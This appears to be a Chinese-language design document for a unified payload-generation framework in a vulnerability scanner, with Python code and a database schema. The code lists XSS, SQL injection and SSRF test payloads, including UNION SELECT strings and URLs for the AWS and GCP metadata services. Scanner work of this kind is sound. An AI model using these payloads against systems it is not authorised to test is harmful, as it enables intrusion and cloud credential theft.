# 統一智慧型 Payload 生成框架

## 背景問題

當前各個 Function 模組都有獨立的 payload 生成邏輯：

- `function_xss/payload_generator.py`
- `function_ssrf/param_semantics_analyzer.py`
- `function_sqli/` 中的分散邏輯

**問題**：

1. Payload 生成邏輯重複
2. 缺乏上下文感知的智慧生成
3. 難以進行全域優化和更新

## 解決方案：SmartPayloadFuzzer 框架

### 架構設計

```python
# services/function/common/smart_payload_fuzzer.py

from abc import ABC, abstractmethod
from enum import Enum
from dataclasses import dataclass
from typing import Dict, List, Any, Optional, Iterator

class PayloadContext(Enum):
    """Payload 上下文類型"""
    HTML_ATTRIBUTE = "html_attribute"
    HTML_CONTENT = "html_content" 
    JAVASCRIPT_STRING = "js_string"
    JAVASCRIPT_CONTEXT = "js_context"
    SQL_QUERY = "sql_query"
    URL_PARAMETER = "url_parameter"
    HTTP_HEADER = "http_header"
    JSON_VALUE = "json_value"
    XML_CONTENT = "xml_content"

class ParameterSemantics(Enum):
    """參數語意類型"""
    URL = "url"
    FILE_PATH = "file_path" 
    USER_ID = "user_id"
    EMAIL = "email"
    SEARCH_QUERY = "search_query"
    REDIRECT_TARGET = "redirect_target"
    CALLBACK_URL = "callback_url"
    GENERIC_INPUT = "generic_input"

@dataclass
class PayloadGenerationRequest:
    """Payload 生成請求"""
    vulnerability_type: str  # "xss", "sqli", "ssrf", etc.
    parameter_name: str
    parameter_value: Optional[str] = None
    context: PayloadContext = PayloadContext.URL_PARAMETER
    semantics: ParameterSemantics = ParameterSemantics.GENERIC_INPUT
    target_info: Dict[str, Any] = None  # 目標應用資訊
    custom_hints: List[str] = None      # 自訂提示

@dataclass  
class GeneratedPayload:
    """生成的 Payload"""
    payload: str
    confidence: float  # 0.0 - 1.0
    payload_type: str  # "basic", "bypass", "blind", etc.
    description: str
    expected_indicators: List[str]  # 預期的檢測指標

class PayloadGenerator(ABC):
    """Payload 生成器介面"""
    
    @abstractmethod
    def generate(self, request: PayloadGenerationRequest) -> List[GeneratedPayload]:
        """生成 payload 列表"""
        pass
    
    @abstractmethod
    def get_supported_contexts(self) -> List[PayloadContext]:
        """獲取支援的上下文"""
        pass

class SmartPayloadFuzzer:
    """智慧型 Payload 模糊測試框架"""
    
    def __init__(self):
        self._generators: Dict[str, PayloadGenerator] = {}
        self._semantic_analyzers: Dict[str, 'SemanticAnalyzer'] = {}
        self._context_detectors: Dict[str, 'ContextDetector'] = {}
        
        # 載入預設生成器
        self._load_default_generators()
    
    def register_generator(self, vuln_type: str, generator: PayloadGenerator):
        """註冊 payload 生成器"""
        self._generators[vuln_type] = generator
    
    def generate_payloads(self, request: PayloadGenerationRequest) -> List[GeneratedPayload]:
        """智慧生成 payload"""
        
        # 1. 語意分析
        enhanced_request = self._analyze_semantics(request)
        
        # 2. 上下文檢測
        enhanced_request = self._detect_context(enhanced_request)
        
        # 3. 生成 payload
        generator = self._generators.get(request.vulnerability_type)
        if not generator:
            raise ValueError(f"No generator for {request.vulnerability_type}")
        
        payloads = generator.generate(enhanced_request)
        
        # 4. 後處理和排序
        return self._post_process_payloads(payloads, enhanced_request)
    
    def _analyze_semantics(self, request: PayloadGenerationRequest) -> PayloadGenerationRequest:
        """分析參數語意"""
        param_name = request.parameter_name.lower()
        
        # 語意推斷規則
        semantic_rules = {
            ParameterSemantics.URL: ['url', 'uri', 'link', 'href', 'redirect'],
            ParameterSemantics.FILE_PATH: ['file', 'path', 'filename', 'upload'],
            ParameterSemantics.USER_ID: ['id', 'user', 'uid', 'user_id'],
            ParameterSemantics.EMAIL: ['email', 'mail', 'e_mail'],
            ParameterSemantics.SEARCH_QUERY: ['q', 'query', 'search', 'keyword'],
            ParameterSemantics.CALLBACK_URL: ['callback', 'return', 'next']
        }
        
        for semantics, keywords in semantic_rules.items():
            if any(keyword in param_name for keyword in keywords):
                request.semantics = semantics
                break
        
        return request
    
    def _detect_context(self, request: PayloadGenerationRequest) -> PayloadGenerationRequest:
        """檢測 payload 上下文"""
        # 基於目標資訊檢測上下文
        if request.target_info:
            content_type = request.target_info.get('content_type', '')
            if 'json' in content_type:
                request.context = PayloadContext.JSON_VALUE
            elif 'xml' in content_type:
                request.context = PayloadContext.XML_CONTENT
        
        return request
    
    def _post_process_payloads(self, payloads: List[GeneratedPayload],
                              request: PayloadGenerationRequest) -> List[GeneratedPayload]:
        """後處理 payload"""
        # 按信心度排序
        payloads.sort(key=lambda p: p.confidence, reverse=True)
        
        # 限制數量（避免過多 payload）
        max_payloads = 50
        return payloads[:max_payloads]

class XssPayloadGenerator(PayloadGenerator):
    """XSS Payload 生成器"""
    
    def __init__(self):
        self._context_payloads = {
            PayloadContext.HTML_ATTRIBUTE: [
                '" onmouseover="alert(1)"',
                "' onmouseover='alert(1)'",
                '"><img src=x onerror=alert(1)>',
            ],
            PayloadContext.HTML_CONTENT: [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
            ],
            PayloadContext.JAVASCRIPT_STRING: [
                "';alert(1);//",
                '";alert(1);//',
                "\\';alert(1);//",
            ],
            PayloadContext.URL_PARAMETER: [
                '<script>alert(1)</script>',
                'javascript:alert(1)',
                '"><script>alert(1)</script>',
            ]
        }
        
        self._semantic_payloads = {
            ParameterSemantics.SEARCH_QUERY: [
                '<script>alert("XSS in search")</script>',
                '"><script>alert(document.domain)</script>',
            ],
            ParameterSemantics.USER_ID: [
                '1<script>alert(1)</script>',
                '"><script>alert("User XSS")</script>',
            ]
        }
    
    def generate(self, request: PayloadGenerationRequest) -> List[GeneratedPayload]:
        """生成 XSS payload"""
        payloads = []
        
        # 基於上下文的 payload
        context_payloads = self._context_payloads.get(request.context, [])
        for payload in context_payloads:
            payloads.append(GeneratedPayload(
                payload=payload,
                confidence=0.8,
                payload_type="context_aware",
                description=f"XSS payload for {request.context.value}",
                expected_indicators=["alert(", "<script", "onerror="]
            ))
        
        # 基於語意的 payload 
        semantic_payloads = self._semantic_payloads.get(request.semantics, [])
        for payload in semantic_payloads:
            payloads.append(GeneratedPayload(
                payload=payload,
                confidence=0.6,
                payload_type="semantic_aware", 
                description=f"XSS payload for {request.semantics.value}",
                expected_indicators=["alert(", "<script"]
            ))
        
        return payloads
    
    def get_supported_contexts(self) -> List[PayloadContext]:
        return list(self._context_payloads.keys())

class SqliPayloadGenerator(PayloadGenerator):
    """SQL Injection Payload 生成器"""
    
    def __init__(self):
        self._database_payloads = {
            'mysql': [
                "' OR '1'='1",
                "' UNION SELECT 1,version(),3--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            ],
            'postgresql': [
                "' OR '1'='1",
                "' UNION SELECT 1,version(),3--",
                "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
            ],
            'generic': [
                "' OR 1=1--",
                "' OR 'a'='a",
                '" OR 1=1--',
                "admin'--",
            ]
        }
    
    def generate(self, request: PayloadGenerationRequest) -> List[GeneratedPayload]:
        """生成 SQLi payload"""
        payloads = []
        
        # 檢測資料庫類型
        db_type = 'generic'
        if request.target_info:
            server_header = request.target_info.get('server_header', '').lower()
            if 'mysql' in server_header:
                db_type = 'mysql'
            elif 'postgres' in server_header:
                db_type = 'postgresql'
        
        # 生成對應資料庫的 payload
        db_payloads = self._database_payloads.get(db_type, self._database_payloads['generic'])
        
        for payload in db_payloads:
            confidence = 0.9 if db_type != 'generic' else 0.7
            payloads.append(GeneratedPayload(
                payload=payload,
                confidence=confidence,
                payload_type=f"{db_type}_specific",
                description=f"SQLi payload for {db_type}",
                expected_indicators=["error", "syntax", "mysql", "postgres"]
            ))
        
        return payloads
    
    def get_supported_contexts(self) -> List[PayloadContext]:
        return [PayloadContext.URL_PARAMETER, PayloadContext.JSON_VALUE]

class SsrfPayloadGenerator(PayloadGenerator):
    """SSRF Payload 生成器"""
    
    def generate(self, request: PayloadGenerationRequest) -> List[GeneratedPayload]:
        """生成 SSRF payload"""
        payloads = []
        
        base_payloads = [
            "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://127.0.0.1:80/admin",
            "http://localhost:8080/",
        ]
        
        for payload in base_payloads:
            payloads.append(GeneratedPayload(
                payload=payload,
                confidence=0.8,
                payload_type="internal_service",
                description="SSRF payload targeting internal services",
                expected_indicators=["connection", "timeout", "refused"]
            ))
        
        return payloads
    
    def get_supported_contexts(self) -> List[PayloadContext]:
        return [PayloadContext.URL_PARAMETER]
```

### 整合到現有 Function 模組

```python
# services/function/function_xss/aiva_func_xss/enhanced_worker.py

from services.function.common.smart_payload_fuzzer import (
    SmartPayloadFuzzer,
    PayloadGenerationRequest,
    PayloadContext,
    XssPayloadGenerator
)

async def process_task_enhanced(
    task: FunctionTaskPayload,
    smart_fuzzer: SmartPayloadFuzzer
) -> TaskExecutionResult:
    """使用智慧 fuzzer 的增強處理"""
    
    # 建立 payload 生成請求
    request = PayloadGenerationRequest(
        vulnerability_type="xss",
        parameter_name=task.target.parameter,
        parameter_value=task.target.value,
        target_info={
            'content_type': task.target.content_type,
            'server_header': task.target.server_info
        }
    )
    
    # 生成智慧 payload
    payloads = smart_fuzzer.generate_payloads(request)
    
    findings = []
    for generated_payload in payloads:
        # 使用生成的 payload 進行測試
        result = await test_xss_payload(
            task=task,
            payload=generated_payload.payload,
            expected_indicators=generated_payload.expected_indicators
        )
        
        if result.is_vulnerable:
            findings.append(build_finding(task, result, generated_payload))
    
    return TaskExecutionResult(findings=findings)
```

### 配置與規則管理

```python
# services/function/common/payload_rules.py

class PayloadRuleManager:
    """Payload 規則管理器"""
    
    def __init__(self, db_connection):
        self.db = db_connection
    
    async def load_rules_from_db(self) -> Dict[str, Any]:
        """從資料庫載入規則"""
        rules = await self.db.fetch("""
            SELECT vulnerability_type, context, payload_template, confidence
            FROM payload_rules 
            WHERE active = true
            ORDER BY priority DESC
        """)
        
        return self._organize_rules(rules)
    
    async def update_rule(self, rule_id: str, new_payload: str, confidence: float):
        """更新規則"""
        await self.db.execute("""
            UPDATE payload_rules 
            SET payload_template = $1, confidence = $2, updated_at = NOW()
            WHERE rule_id = $3
        """, new_payload, confidence, rule_id)
```

### 資料庫表設計

```sql
-- Payload 規則表
CREATE TABLE payload_rules (
    rule_id VARCHAR(50) PRIMARY KEY,
    vulnerability_type VARCHAR(20) NOT NULL,
    context VARCHAR(50),
    semantics VARCHAR(50), 
    payload_template TEXT NOT NULL,
    confidence DECIMAL(3,2),
    priority INTEGER DEFAULT 100,
    active BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW(),
    created_by VARCHAR(100)
);

-- 規則使用統計表
CREATE TABLE payload_rule_stats (
    rule_id VARCHAR(50) REFERENCES payload_rules(rule_id),
    success_count INTEGER DEFAULT 0,
    total_count INTEGER DEFAULT 0,
    last_used TIMESTAMP DEFAULT NOW()
);
```

## 實施計劃

### 階段 1: 核心框架（2 週）

- 實現 `SmartPayloadFuzzer` 基礎架構
- 實現 `XssPayloadGenerator`
- 基礎單元測試

### 階段 2: 擴展生成器（2 週）

- 實現 `SqliPayloadGenerator`
- 實現 `SsrfPayloadGenerator`
- 語意分析和上下文檢測

### 階段 3: 整合現有模組（2 週）

- 修改 `function_xss` 使用新框架
- 修改 `function_sqli` 使用新框架
- 向後相容處理

### 階段 4: 規則外部化（1 週）

- 資料庫規則管理
- 動態規則更新
- 管理介面

**總計**: 7 週

## 效益預期

1. **統一管理**: 所有 payload 生成邏輯集中管理
2. **智慧化**: 基於上下文和語意的智慧生成
3. **可擴展**: 易於添加新的漏洞類型支援
4. **動態更新**: 無需重新部署即可更新檢測規則
5. **效能提升**: 減少無效 payload，提高檢測精度
